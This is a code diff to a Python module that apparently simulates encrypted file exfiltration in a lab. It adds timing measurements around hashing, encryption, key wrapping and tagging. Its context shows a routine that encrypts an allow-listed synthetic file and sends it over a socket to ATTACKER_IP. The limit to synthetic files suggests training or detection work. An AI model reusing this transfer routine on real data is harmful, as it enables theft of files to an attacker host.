@@ -17,6 +17,15 @@ from shared.crypto import aes_encrypt, generate_aes_key, generate_iv, rsa_wrap_k
 from shared.transfer_protocol import FILE_CHOICES, MAX_CIPHERTEXT, header, tag
 
 
+def _measure(name, function, records):
+    ts = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
+    started = time.perf_counter_ns()
+    result = function()
+    records.append({"ts": ts, "operation": name,
+                    "duration_ms": round((time.perf_counter_ns() - started) / 1e6, 6)})
+    return result
+
+
 def send_file(relative):
     if relative not in FILE_CHOICES:
         raise ValueError("File is not an approved synthetic sample")
@@ -29,11 +38,14 @@ def send_file(relative):
     plaintext = path.read_bytes()
     if len(plaintext) > MAX_CIPHERTEXT - 16:
         raise ValueError("File exceeds lab transfer limit")
+    operations = []
+    digest = _measure("hash_plaintext", lambda: hashlib.sha256(plaintext).hexdigest(), operations)
     key, iv = generate_aes_key(), generate_iv()
-    ciphertext = aes_encrypt(plaintext, iv, key)
-    wrapped = rsa_wrap_key(key, RSA_PUB_KEY_PATH)
+    ciphertext = _measure("encrypt", lambda: aes_encrypt(plaintext, iv, key), operations)
+    ciphertext_sha256 = _measure("hash_ciphertext", lambda: hashlib.sha256(ciphertext).hexdigest(), operations)
+    wrapped = _measure("wrap_key", lambda: rsa_wrap_key(key, RSA_PUB_KEY_PATH), operations)
     payload = header(relative, len(ciphertext), iv, wrapped) + ciphertext
-    packet = payload + tag(key, payload)
+    packet = payload + _measure("authenticate_payload", lambda: tag(key, payload), operations)
     started = time.perf_counter()
     with socket.create_connection((ATTACKER_IP, TRANSFER_PORT), timeout=10) as connection:
         connection.settimeout(15)
@@ -45,7 +57,8 @@ def send_file(relative):
     elapsed = round(time.perf_counter() - started, 4)
     record = {"ts": datetime.now(timezone.utc).isoformat(timespec="milliseconds"),
               "module": "transfer", "event": "file_sent", "file": relative,
-              "bytes": len(plaintext), "sha256": hashlib.sha256(plaintext).hexdigest(),
+              "bytes": len(plaintext), "sha256": digest, "ciphertext_sha256": ciphertext_sha256,
+              "operations": operations,
               "elapsed_s": elapsed, "dst_ip": ATTACKER_IP, "dst_port": TRANSFER_PORT}
     log_dir = Path(LOG_DIR)
     if log_dir.resolve(strict=False).is_relative_to(root.resolve()):
